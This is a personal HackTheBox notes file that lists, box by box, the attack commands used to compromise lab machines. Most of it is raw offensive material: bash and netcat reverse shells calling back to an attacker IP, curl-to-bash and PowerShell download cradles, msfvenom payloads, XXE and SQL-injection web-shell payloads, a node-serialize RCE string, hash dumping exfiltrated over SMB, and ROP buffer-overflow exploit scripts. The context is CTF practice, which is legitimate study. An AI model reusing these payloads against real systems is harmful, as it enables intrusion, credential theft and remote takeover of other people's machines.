+[kali >] ssh -i matt matt@10.10.11.14		[ssh into the box to escape from apache process, which was preventing sudo -l]
+
+echo -n 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1' | base64 -w 0
+POST ?cmd=echo -n YmFaz......== | base64 -d | bash	[and CTRL+U to obtain shell if bad characters]
+___________________________________________________________________________________________________________
+
+BOX:BACKDOOR
+
+http://10.10.11.125/wp-content/
+http://10.10.11.125/wp-admin/
+http://10.10.11.125/wp-content/plugins/		[enumerating some default wordpress pages]
+
+for i in $(seq 0 1000); do curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/${i}/cmdline done		[lfi exploit and listing all running services]
+
+screen -ls root/
+screen -r root/			[attach to root's screen, which had suid set]
+____________________________________________________________________________________________
+
+BOX:SECRET
+
+http://jwt.io		(review and modify jwt token contents)
+
+git log
+git show 1289738927	[.git dir in source code leaking all previous commits]
+
+script shell.out 	[KEEP A LOG OF EVERYTHING YOU DID ON THE SHELL!!!]
+
+echo -n 'bash -i  >& /dev/tcp/10.10.14.8/9001  0>&1' | base64 -w 0
+[code execution in the GET request, double spaces to get rid of + s in the base64 output]
+GET /api/logs?file=whoami;echo -n YmF32f20nndq2mum...hd29N | base64 -d | bash         [and CTRL+U]
+
+apport-unpack _opt_count.1000.crash /dev/shm/report	(kill -11 the program and extract file contents from crash report)
+
+__________________________________________________________________________________________________
+
+BOX:HORIZONTAL
+
+gobuster dir -u http://horizontal.htb -w /opt/seclists/Discovery/Web-Content/raft-small-words.txt -x html
+(-x for html scripts)
+gobuster vhost -w /opt/seclists/Discovery/dns/subdomains-top1million-110000.txt -u http://horizontal.htb
+
+https://www.exploit-db.com/exploits/49424	[finding out laravel is in debug mode and finding an laravel debug exploit]
+
+python -m http.server
+shell.sh: bash -i  >& /dev/tcp/10.10.14.8/9001  0>&1
+curl 10.10.14.8/shell.sh | bash		[code execution of web shell to get around bad chars]
+____________________________________________________________________________________________________________
+
+BOX:PREVISE
+
+grep '$_' * 		[grep from php sourcecode everything that will be user input]
+
+vi gzip
+    #!/bin/bash
+    bash -i >& /dev/tcp/10.10.14.8/9001 0>&1		[gzip path injection]
+export PATH=.:$PATH
+
+wfuzz -u http://10.10.11.104/accounts.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=ippsec&password=PleaseSubscribe&FUZZ=ippsec' -w /opt/seclists/Discovery/Web-Content/burp-parameter-names -hh	[POST req parameter fuzzing]
+
+______________________________________________________________________________________
+
+BOX:NODEBLOG
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+[this website has an xml upload form]
+
+<!--?xml version="1.0" ?-->
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&test;</lastName>		[confirm to the expected xml structure here]
+ </userInfo>
+
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///opt/blog/server.js'>]>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///opt/blog/app.js'>]>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///opt/blog/main.js'>]>
+[bruteforcing node.js express source code. made request with syntax error, error message revealed app root folder previously]
+
+[discovering from source code that app uses node-serialize module with known vuln]
+https://security.snyk.io/package/npm/node-serialize/0.0.4
+{"rce":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"ls /\", function(error, stdout, stderr) { console.log(stdout) });}()"}
+[add this payload to the json parameter that uses node-serialize module]
+
+mongodump
+bsondump users.bson		[dump mongodb to get creds after gaining access to the webapp machine]
+______________________________________________________________________________________________________
+
+BOX:BOUNTYHUNTER
+
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+[xxe extracting php files (php has bad chars for xml)]
+
+eval('11__import__("os).system("bash")')	[eval code execution in a custom py program in the machine]
+____________________________________________________________________________________________________
+
+BOX:EXPLORE
+
+____________________________________________________________________________________________________
+
+BOX:CAP
+
+http://10.10.10.245/admin 	[django default admin page]
+
+import os
+os.setuid(0)		[python3 had setuid bit set and was owned by root]
+os.system('sh')
+
+______________________________________________________________________________
+
+BOX:VALIDATION
+
+username=ippsec&country=Brazil' union select 1-- -	[union injection, country fetched from db normally selected from a dropdown by user]
+username=ippsec&country=Brazil' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/shell.php'-- -		[use this union injection to upload a php shell]
+____________________________________________________________________________________________________
+
+BOX:KNIFE
+
+____________________________________________________________________________________________________
+
+BOX:LOVE
+
+ffuf -u http://staging.love.htb/beta.php  -timeout 1 -d 'file=http://127.0.0.1:FUZZ&read=Scan+File' -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded'
+[using file upload file path text input to make a port sweep of itself, accessing PROHIBITED web server running at port 5000]
+
+cp /usr/share/nishang/shells/Invoke-PowerShellTcpOneLine.ps1
+vi Invoke-PowerShellTcpOneLine.ps1
+python3 -m http.server
+shell.php?cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/shell.ps1')"
+
+[AlwaysInstallElevated set to Enabled]
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=9001 -f msi > payload.msi
+curl 10.10.14.8:8000/payload.msi -o payload.msi
+msiexec /q /i payload.msi
+____________________________________________________________________________________________________
+
+BOX:ARMAGEDDON
+
+https://github.com/ClumsyLulz/DScanner		[drupal automated vuln scanner]
+
+http://10.10.10.233/CHANGELOG.txt		[looking at change log to get drupal version]
+sites/default/settings.php			[googleing mysql config file location for drupal and finding creds in the file]
+
+[gtfobins snap sudo exploit][run this on kali machine to generate payload:]
+COMMAND="chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash"
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh\n%s; false' "$COMMAND" > meta/hooks/install
+chmod +x meta/hooks/install
+fpm -n xxxx -s dir -t snap -a all meta
+[COMMAND=bash did not give shell so we are setting setuid for bash copied to our home dir]
+[then on target machine:]
+sudo snap install meta --dangerous --devmode
+
+____________________________________________________________________________________________________
+
+BOX:SPECTRA
+
+____________________________________________________________________________________________________
+
+BOX:SCRIPTKIDDIE
+
+ffuf -u http://10.10.10.226:5000 -d 'ip=127.0.0.1FUZZ&action=scan' -w /opt/Seclists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-encoded'
+[this was a webapp running nmap from the webpage, showing how to fuzz with special characters after user input in ffuf]
+
+curl 10.10.14.8/shell.sh | bash		[download a bash shell from our http shell and pipe it to bash]
+
+____________________________________________________________________________________________________
+
+BOX:DELIVERY
+
+[sucrack for brute forcing su user, as ssh for root is usually not permitted]
+git clone https://github.com/hemp3l/sucrack
+./configure 		[try autoreconfig -f -i if errors]
+make
+wget 10.10.14.2/sucrack
+chmod +x sucrack
+./sucrack -u root -r pwlist.txt 
+
+____________________________________________________________________________________________________
+
+BOX:LUANNE
+
+set payload generic/shell_reverse_tcp
+set payload bsd/x64/shell_reverse_tcp			[OS is NetBSD in this box]
+
+ffuf -u http://10.10.10.218/weather/forecast?city=\'FUZZ-- -w /usr/share/SecLists/Fuzzing/special-chars.txt
+[finding out backtick gives a different error, running fuzz again to find another character to follow after backtick and then comment in lua]
+
+[netcat openbsd reverse shell]
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+[and pipe it to sh instead of bash]
+
+cat .htpasswd	[found creds in webserver folder]
+
+curl localhost:3001/~r.michaels/ --user webapi_user:iamthebest		[finding out http server runs with -u flag, which creates user directories, and accesses internal web server with authenticated user]
+
+doas sh		[su - for netbsd os]
+____________________________________________________________________________________________________
+
+BOX:ACADEMY
+
+cd /var/log/audit		[discovering our user is part of adm group and can access /var/log]
+aureport -ttys			[reviewing terminal audit to find su creds]
+____________________________________________________________________________________________________
+
+BOX:DOCTOR
+
+[SSRF in the comment box]
+title=test&content=http://10.10.14.4/$(whoami)&submit=Post
+title=test&content=http://10.10.14.4/$({echo,test})&submit=Post
+title=test&content=http://10.10.14.4/$(echo$IFS'test')&submit=Post
+
+sqlite3 site.db dump		[dump saved db file]
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+____________________________________________________________________________________________________
+
+BOX:OMNI
+
+https://github.com/SafeBreach-Labs/SirepRAT		[IOT device attack]
+
+echo "IEX(New-Object Net.WebClient().downloadString('http://10.10.14.2:8000/')" | iconv -t utf-16le | base64 -w 0
+[windows compatible Base64 encoded command]
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell IWR -Uri http://10.10.14.2:8000/nc64.exe -Outfile C:\nc64.exe" --v --return_output	[use the SirepRAT tool to run commands]
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\nc64.exe -e powershell 10.10.14.2:9001" --v --return_output
+
+reg save HKLM\SYSTEM C:\system.reg
+reg save HKLM\PAM C:\pam.reg			[save pam files in system folders]
+impacket-smbserver shared_folder $(pwd)
+copy SAM \\10.10.14.2\shared_folder\test	[use impacket to create smb in kali machine and send the file]
+impacket-secretsdump -system system.reg -sam sam.reg local		[dump hashes]
+
+____________________________________________________________________________________________________
+
+BOX:TABBY
+
+10.10.10.194:8080/manager	[trying default tomcat manager login]
+cd /opt/SecLists/Passwords/Default-Credentials/ && find . | grep tomcat		[bunch of default creds for applications]
+news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml	[lfi tomcat users file to fetch creds]
+10.10.10.194:8080/manager/text/deploy		[deploy files in tomcat using curl]
+
+[upload web shell to tomcat]
+https://github.com/tennc/webshell		[alot of webshells]
+cp /webshells/cmdjsp.jsp .				[java webshell, since tomcat is java based]
+zip cmdjsp.war cmdjsp.jsp
+curl -T cmdjsp.war -u 'tomcat:SupersecurePassword' http://10.10.10.194:8080/manager/text/deploy?path=/app
+
+zip2john backup.zip		[crack password protected zip file]
+./john zip.hash --wordlist=/opt/wordlist/rockyou.txt
+
+[LXD PRIVESC FOR LINUX]
+https://github.com/b4rdia/HackTricks/blob/master/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md
+cd /mnt/root 				[where root fs will be mounted]
+_____________________________________________________________________________
+
+BOX:BLUNDER
+
+[Login brute force IP blocking bypass]
+X-FORWARDED-FOR: 127.0.0.1
+
+cewl http://10.10.10.191 > words		[build a wordlist from a website]
+
+[.htaccess:]
+RewriteEngine
+AddType application/x-http-php .png		[exploiting a file upload to upload a php shell with png ext, we also need to upload this to run it as php]
+
+[sudo underflow vulnerability]
+sudo -u#-1 bash		[sudo -l showed (ALL, !root) permission]
+_________________________________________________________________________________________________
+
+BOX:ADMIRER
+
+[sudo -l showed (ALL) SETENV:, so we replace an py file imported by a sh script with malicious code and add it to the path]
+vi shutil.py
+    import os
+    def make_archive(a,b,c):
+	os.system("nc -c bash 10.10.14.2 9001")	[reverse shell was connecting but io not working, we switched to nc shell]
+sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
+_________________________________________________________________________________________________
+
+BOX:TRACEBACK
+
+/opt/Seclists/Discovery/Web-Content/Common-Backdoors-PHP.fuzz.txt
+[site has been already pwn3d, and we gobuster to find the installed webshell]
+
+[sudo -l had the line: User webadmin may run the following commands: (sysadmin) NOPASSWD: /home/sysadmin/luvit
+sudo -u sysadmin /home/sysadmin/luvit
+
+/etc/update-motd.d/ [cron job shows message of the day every time you login with ssh etc, added bash revshell to get admin]
+_________________________________________________________________________________________________
+
+BOX:OPENADMIN
+
+cp index.html . [exploit script was in html code, we copied as index.html, started python3 http server and visited localhost on the browser to use the exploit interface]
+
+SELECT User FROM mysql.user;	[dump mysql users and creds]
+
+medusa -h 10.10.10.171 -U users.txt -P passwords.txt -M ssh 10.10.10.171   (password spraying, hydra alternative)
+
+./sucrack -a -w 20 -s 10 -u root -rl jimmy passwords.txt 	[bruteforce su login]
+
+find . -readable -u jimmy 
+find . -writable -u jimmy 
+cat ./.local/share/nano/search_history		[found during browsing writable/readable files, can have sensitive info]
+
+./sshng2john.py ssh.key > openadmin.ssh				[ssh key was encrypted]
+john --wordlist=/opt/wordlists/rockyou.txt openadmin.ssh
+
+sudo /bin/nano /opt/priv		[user joanna can run sudo for this command, so we run it, then ctrl+R inside nano to read other files own by root, such as /etc/shadow to steal root hash or /root/.ssh/id_rsa]
+* * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.2/9000 0>&1' [or from nano CTRL+R to write out file to /var/spool/cron/crontabs/root]
+[OR]
+CTRL+R CTR+X reset sh 1>&0 2>&0				[execute shell from sudo nano]
+_________________________________________________________________________________________________
+
+BOX:TRAVERXEC
+
+set Proxies http:127.0.0.1:8080			(how to set up proxy in msf)
+
+./LinEnum.sh -t		(run linenum in thorough mode)
+
+dos2unix 35416.sh		(exploit had ^M character error)
+_________________________________________________________________________________________________
+
+BOX:POSTMAN
+
+nc -v 10.10.10.160 6379		[connect to redis]
+(enum)
+INFO				
+CONFIG GET *
+nmap --script=redis-info 10.10.10.160
+(upload a web shell)
+apt-get install redis-tools		
+redis-cli -h 10.10.10.160
+config set dir /var/www/html/uploads
+config set dbfilename reddis.php
+set test "<?php phpinfo(); ?>"
+save
+(save ssh key (-add 2 line breaks before and after sshkey.pub file))
+cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit
+redis-cli -h 10.10.10.160
+config set dir /var/lib/redis/.ssh/
+config set dbfilename "authorized_keys"
+save
+chmod 600 postman
+ssh -i postman redis@10.10.160
+
+{ping,-c,1,10.10.14.21}		(exploit didn't allow spaces so bash also supports this bracket expansion. Note: it does not support pipes inside)
+_________________________________________________________________________________________________
+
+BOX:NETWORKED
+
+grep -Ri '$_' upload.php	(check for user input in php files)
+
+GIF8;<?php system($_GET['cmd']); ?>	(file upload page checking for mime type so we add magic bites in php request)
+
+10.10.10.146/uploads/shell.php.gif?cmd=whoami	(even though we had to upload with a gif extension, this might still work depending on apache configuration)
+
+<?php require '/var/www/html/lib.php';  	(if we can edit lib.php we can get code execution from this)
+
+https://seclists.org/fulldisclosure/2019/Apr/24		(Redhat/CentOS network-scripts code execution and privesc to root. we were given permission to run /etc/sysconfig/network-scripts as sudo)
+_________________________________________________________________________________________________
+
+BOX:HAYSTACK
+
+[Elastic Search API]
+curl http://10.10.10.115:9200/_cat/indices?v		(show tables)
+curl http://10.10.10.115:9200/quotes/search | jq	(print all rows of table 'quotes')
+curl http://10.10.10.115:9200/quotes/search?size=253 | jq '.hits .hits[0] ._source .email' (extract specific json {} or array [] element from all rows)
+
+(after ssh'ing to the box, how to do port forwarding:)
+george@haystack ~C
+ssh> -L 5601:127.0.0.1:5601
+
+[Node.js reverse shell]
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "192.168.33.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+_________________________________________________________________________________________________
+
+BOX:SAFE
+
+[Find buffer overflow entry point]
+chmod +x myapp
+gdb ./myapp				(gef must be installed)
+gef> r					(to run the app and create a buffer overflow by 
+gef> registers				(look at the registers to see overflowed buffer)
+get> pattern search $rsp		(at which character overflow will start)
+
+[exploit.py]
+from pwn import *
+#p = gdb.debug('./myapp', 'b main')
+p = remote('10.10.10.194',1337)
+context(os='linux',arch='amd64')
+junk= ("A" * 112).encode()
+bin_sh = "/bin/sh\x00".encode()
+plt_system = p64(0x40116e)			#memory address of system call inside the source call
+pop_r13 = p64(0x401205)
+null = p64(0x0)
+test = p64(0x4011e7)
+p.recvuntil("Input:")
+p.sendline(junk + bin_sh + pop_r13 + plt_system + null + null + test)
+(explanation: we found a test function that has a r13 that copies rsp > rdi, also has 2 random pops seen in the ropper output chain so we put nulls for those 2)
+ropper --file ./myapp --search "pop rdi"	(to find rdi pop chain)
+
+objdump -D myapp | grep -i system (to find memory addresses of functions etc inside the source code)
+
+binwalk IMG_0247.jpg		(find embedded data inside image files)
+
+for i in $(ls *.JPG); do keepass2john -k $i MyPasswords.kdbx | sed "s/MyPasswords/$i/g" >> keepass_hashes; done 
+(keepass hashing, image files were provided as key files)
+apt install kpcli	(keepass client)
+kpcli --kdb MyPasswords.kdbx --key IMG_0547.jpg
+	ls			(show all password entries)
+	show 0 -f		(show password for entry 0)
+_________________________________________________________________________________________________
+
+BOX:WRITEUP
+
+http://10.10.10.154/writeup/doc/CHANGELOG.txt		(found default changelog.txt in the repo of CMS, which was kept in the web server, and found CMS Made Simple version)
+
+hashcat -m 20 'PW_HASH:SALT' /usr/share/wordlists/rockyou.txt  (there are 2 different modes for md5 hash+salt or salt+hash)
+
+(we found out we are part of debian staff group, which gives permission to write to /usr/local/bin, which is the first entry in PATH. next we use pspy to check running processes real time to find that does not use absolute path, for path hijaction)
+git clone https://github.com/DominicBreuker/pspy.git    (if you let it run for a minute it finds things cron doesn't show)
+go build 
+./pspy
+cd /usr/local/bin
+vi run-parts				(path hijack of this running process)
+	#!/bin/bash
+	mkdir ~/.ssh
+	echo 'ssh-rsa AAA......zM= root@htb' > ~/.ssh/authorized_keys
+	chmod 600 ~/.ssh/authorized_keys
+_________________________________________________________________________________________________
+
+BOX:SWAGSHOP
+
+php magescan.phar scan:all http://10.10.14.147		(magento vuln scanner)
+
+"bash -c 'bash -i >& dev/tcp/10.10.10.14/9001 0>$1'"	(reversing quotes inside out worked for some reason..)
+
+:!/bin/bash		(user can run vi as sudo so we ran this in vi)
+_________________________________________________________________________________________________
+
+BOX:HELP
+
+response = requests.head('http://10.10.14.127/help')
+serverTime = response.headers['Date']			(get server local time)
+
+10.10.10.121:3000/graphql?query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}
+(make a graphql query that will dump all the meta-information from the graphql)
+10.10.10.121:3000/graphql?query={+user+{+username,+password+}+}
+(make a query for user object)
+_________________________________________________________________________________________________
+
+BOX:IRKED
+
+steghide extract -sf irked.jpg -p password		(stenography)
+
+ltrace ./viewuser		(ltrace intercepts and records dynamic library calls which are called by an executed process)
+(shows below calls:)
+setuid(0);			(sets running process's user to root)
+system("/tmp/tempfile");        (so we write #!/bin/bash /bin/bash to this file and get a root shell)
+system("who")			(or we write #!/bin/bash /dev/shm/who, export PATH=/dev/shm:$PATH and get a root shell by path hijack)
+_________________________________________________________________________________________________
+
+BOX:TEACHER
+
+Host: localhost
+X-Forwarded-For: localhost	(can circumvent forbidden /phpmyadmin page that has a proxy setting to only allow localhost)
+
+/*comment*/`$_GET[cmd]`;//comment	(php command execution)
+
+go get github.com/dominicbreuker/pspy/cmd
+GOOS=linux GOARCH=amd64 go build		(download and build pspy)
+./pspy							
+
+rm -rf tmp
+ln -s /etc/shadow /home/giovanni/work/tmp	(there was a cron job that makes a backup inside /tmp and does chmod 777 on that backup file so with this symlink we made /etc/shadow editable and changed the root password inside the /etc/shadow to an user's we already know)
+_________________________________________________________________________________________________
+
+BOX:CURLING
+
+cewl -w cewl.out 10.10.10.150		(build a wordlist based on a website)
+
+joomscan --url http://10.10.10.150 -ec  [joomla vulnerability scanner]
+
+10.10.10.150/administrator/manifest/joomla.xml		(enumerate joomla version)
+10.10.10.150/administrator/				(joomla default login)
+
+wfuzz -w users.txt -d 'username=FUZZ&password=Curling2018%21' -b 'c289427b234a39c322b2z'	(how to add a cookie to wfuzz)
+
+http://10.10.10.14/templates/protostar/index.php?cmd=whoami	(joomla template edit code execution)
+
+xxd -r password_hexdump.txt	(reverse the hex dumped file)
+
+file:///etc/passwd (there was a cronjob running curl as root so we changed curl's parameter to file instead of http:// to read root-only files)
+
+[sudoers:]
+cp /etc/sudoers /home/kali/www/sudoers
+floris	ALL=(ALL:ALL) ALL		(add this line to the sudoers file)
+[input.txt:]
+url = "http://10.10.14.3/sudoers"
+output = "/etc/sudoers"
+user-agent = "superagent/1.0"		(curl -K input.txt was running as a root cron job so we used this to overwrite with a sudoers we edited. so now floris can do sudo su - and become root)
+_________________________________________________________________________________________________
+
+BOX:FROLIC
+
+for i in admin dev backup test; do gobuster -u http://10.10.111:9999/$i -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt; done	(repeat gobuster with the subdirectories found)
+
+file gibberish_page	(we see random gibberish later to discover it is a zip file)
+
+hydra -l admin -P passwords.txt smb://10.10.10.111	(use hydra for smb)
+
+gdb user_binary
+    pattern_create 100
+    r 'AAAAA...AAAAA'	(run with this as input param to the binary, we see a buffer overflow SIGSEGV at 0x41474141)
+    pattern_offset 0x41474141   (outputs 52)
+    r 'AAAA...AAAd3adc0d3'	(we send 52 A's and we see d3ad at EIP, c0d3 at ESP)
+[ROP Attack:]
+ldd rop		(to get libc address)
+readelf -s /libc/i386-linux-gnu/libc.so.6 | grep -i system (get system@@GLIBC_2.0 address)
+readelf -s /libc/i386-linux-gnu/libc.so.6 | grep -i exit (get exit@@GLIBC_2.0 address)
+strings -atx /libc/i386-linux-gnu/libc.so.6 | grep /bin/sh
+[exploit.py:]
+import struct
+junk = 'A'*52
+libc = 0xb7e19000
+system = struct.pack('<I', libc + 0x0003ada0)
+exit = struct.pack('<I', libc + 0x002e9d0)
+binsh = struct.pack('<I', libc + 0x0015ba0b)
+payload = junk+system + exit + binsh
+print(payload)
+(then use this payload as the parameter to the binary)
+_________________________________________________________________________________________________
+
+BOX:SUNDAY
+
+[Enumerate fingerd service on port 79]
+git clone https://github.com/pentestmonkey/finger-user-enum.git	
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/names.txt -t 10.10.10.76
+msf > use auxiliary/scanner/finger/finger_users
+
+(hydra didn't work on this old solaris system ssh due to different key exchange or something)
+patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'
+
+LOGNAME='() { :;}; echo PleaseSubscribe' sudo /root/troll    (shell shock on a bash script that the user can run as root)
+
+sudo wget -i /etc/shadow		(sudo wget exploit)
+(sudo wget exploit 2:)
+(bashshell.sh:)
+    !#/bin/sh
+    bash
+sudo wget 10.10.10.14/bashshell.sh -O /root/troll
+sudo /root/troll
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
